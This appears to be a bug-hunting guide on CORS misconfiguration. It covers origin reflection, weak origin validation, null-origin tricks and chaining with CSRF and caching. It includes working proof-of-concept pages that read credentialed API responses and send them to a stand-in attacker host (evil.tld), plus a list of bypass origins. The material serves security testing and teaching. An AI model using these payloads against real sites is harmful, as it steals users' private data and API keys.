# CORS Misconfiguration

CORS is a relaxation of the same-origin policy, and every relaxation is a chance to relax too far. The bug is almost always in how the server decides what `Access-Control-Allow-Origin` to return, especially when it reflects the request's `Origin` while also allowing credentials.

## The mental model

Same-origin policy stops site A from reading site B's authenticated responses. CORS lets B opt specific origins in. The dangerous combination is `Access-Control-Allow-Origin: <attacker-controlled>` together with `Access-Control-Allow-Credentials: true`, because then the attacker's page can make a credentialed request to the target and read the response, including private data and tokens. If the server reflects whatever `Origin` you send, you win.

## Where it hides / tell-tales

- **Origin reflection with credentials**: send `Origin: https://evil.tld`, and the response comes back `Access-Control-Allow-Origin: https://evil.tld` plus `Access-Control-Allow-Credentials: true`. Game over for that endpoint.
- **Weak origin validation**: the server allows anything matching a loose rule: `endsWith("target.com")` (so `eviltarget.com` or `target.com.evil.tld` passes), `startsWith("https://target.com")` (so `https://target.com.evil.tld`), substring match, or allowing all subdomains (so an XSS or takeover on any subdomain reads everything).
- **`null` origin allowed**: `Access-Control-Allow-Origin: null` is reachable from sandboxed iframes, `data:`/`file:` URLs, and redirects. An attacker page in a sandboxed iframe sends `Origin: null` and reads the response.
- **Pre-flight not actually enforced**: the server returns permissive CORS on the preflight but the real request leaks data anyway, or the endpoint is a "simple request" that skips preflight entirely.
- **Wildcard with credentials via proxy quirks**: `ACAO: *` cannot be used with credentials by spec, but some setups reflect or post-process headers in ways that reintroduce the combination.

## Real material

The test and the exploit. First, probe reflection:

```http
GET /api/account HTTP/1.1
Host: app.target.com
Origin: https://evil.tld
Cookie: session=<victim-style>

-- vulnerable response --
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.tld
Access-Control-Allow-Credentials: true
{ "email":"victim@target.com", "apiKey":"sk_live_..." }
```

The attacker page that steals the data:

```html
<script>
fetch('https://app.target.com/api/account', { credentials: 'include' })
  .then(r => r.text())
  .then(d => navigator.sendBeacon('https://evil.tld/c', d));
</script>
```

The `null` origin trick (hosted in a sandboxed iframe so the browser sends `Origin: null`):

```html
<iframe sandbox="allow-scripts allow-same-origin" srcdoc="
  <script>
    fetch('https://app.target.com/api/account',{credentials:'include'})
      .then(r=>r.text()).then(d=>fetch('https://evil.tld/c?d='+encodeURIComponent(d)));
  </script>">
</iframe>
```

Weak-validation bypass origins to try:

```
Origin: https://target.com.evil.tld      (suffix of allowed host as prefix of yours)
Origin: https://eviltarget.com           (endsWith("target.com"))
Origin: https://target.com.evil.tld
Origin: https://sub.target.com           (if all subdomains allowed + you own a subdomain via takeover/XSS)
Origin: null
Origin: https://target.com%60.evil.tld   (parser confusion in some validators)
```

## Beyond the basics

- **CORS turns CSRF into full account read**: a CSRF lets you send a request but not read the response; a credentialed CORS misconfig lets you read it. The combination steals CSRF tokens, PII, API keys, and session-bound secrets, upgrading a write-only CSRF into data exfiltration and often account takeover.
- **Subdomain trust is transitive risk**: if the API allows `*.target.com`, then any XSS, subdomain takeover (see `Subdomain-Takeover.md`), or a single compromised/forgotten subdomain becomes a CORS-reading foothold against the main API. Enumerate what subdomains are trusted.
- **Internal/dev origins allowed in prod**: configs that allow `localhost`, `127.0.0.1`, `*.dev.target.com`, or staging origins. An attacker hosts on an allowed-looking origin or uses a `localhost`-allowed config via a local redirect.
- **Pre-flight bypass with simple requests**: `GET`, `HEAD`, and `POST` with `text/plain`/form content types skip preflight. If the sensitive endpoint is reachable as a simple request, the browser sends it before any preflight can gate it; the only thing standing between attacker and data is the `ACAO` header on the response.
- **Chaining with cache**: if a permissive `ACAO` response gets cached and served to others (see `Web-Cache-Poisoning-and-Deception.md`), or if the `Vary: Origin` header is missing so a cached response leaks the wrong origin's allowance, the misconfig spreads.
- **WebSocket cross-origin**: WebSockets do not use CORS and the handshake often ignores `Origin`; a related but separate class, see `WebSockets.md`.

## What to watch for

- `ACAO: *` without `Allow-Credentials: true` is usually low or informational for public data; the severity comes from the credentialed read. Confirm credentials are honored and private data returns.
- A reflected origin that returns no sensitive data is not impactful; find an endpoint that returns PII, tokens, or lets you read the CSRF token.
- Browsers enforce that `*` and credentials cannot combine; if you only see `*`, look for the reflection or `null` variants instead.
- Prove with your own account's data; do not exfiltrate real users.

## Hunting checklist

- For each authenticated API endpoint, send a foreign `Origin` and check whether it is reflected with `Allow-Credentials: true`.
- Test weak-validation bypasses: suffix, prefix, substring, subdomain, and `null`.
- Confirm the response contains sensitive data and that credentials are actually attached.
- Check `Vary: Origin` and caching to see if the allowance can leak to others.
- Enumerate trusted subdomains and dev/localhost origins allowed in production.
- Chain with CSRF to upgrade write-only bugs into data theft.
